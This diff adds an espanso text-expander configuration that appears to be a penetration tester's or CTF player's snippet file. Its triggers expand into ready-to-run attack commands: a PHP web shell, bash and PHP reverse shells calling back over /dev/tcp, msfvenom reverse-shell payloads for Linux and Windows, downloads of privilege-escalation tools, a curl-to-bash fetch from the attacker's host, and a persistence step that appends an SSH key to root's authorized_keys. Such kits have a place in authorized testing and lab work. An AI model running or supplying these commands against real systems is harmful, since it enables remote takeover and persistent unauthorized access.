@@ -1,0 +1,64 @@
+# espanso match file
+
+# For a complete introduction, visit the official docs at: https://espanso.org/docs/
+
+# You can use this file to define the base matches (aka snippets)
+# that will be available in every application when using espanso.
+global_vars:
+  - name: "IP"
+    type: "shell"
+    params:
+      cmd: "hostname -I | awk -F \" \" '{print $NF}'"
+
+  - name: "ssh_key"
+    type: "shell"
+    params:
+      cmd: "cat /home/kali/.ssh/id_rsa.pub"
+
+matches:
+  - trigger: ":nmap"
+    replace : nmap -sC -sV -v -p- -o nmap --min-rate 
+
+  - trigger: ":setup"
+    replace : |
+      mkdir net && cd net 
+      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
+      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O lp.sh & 
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230219/winPEASany.exe -O wp.exe & 
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_CHATTR -O chattr &
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
+      sudo python3 -m http.server 80
+
+  - trigger: ":nc"
+    replace: |
+      nc -nvlp 443
+
+  - trigger: ":pty"
+    replace: |
+      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
+      export TERM=tmux-256color
+      stty rows 54
+      stty columns 141
+
+  - trigger: ":tty"
+    replace: |
+      reset
+      stty raw -echo; fg
+      stty rows 54 
+      stty columns 141
+      export TERM=tmux-256color
+
+  - trigger: ":persist"
+    replace: |
+      mkdir -p /root/.ssh
+      echo {{ssh_key}} >> /root/.ssh/authorized_keys
+  
+  - trigger: ":rev"
+    replace: curl http://{{IP}}/shell.sh | bash
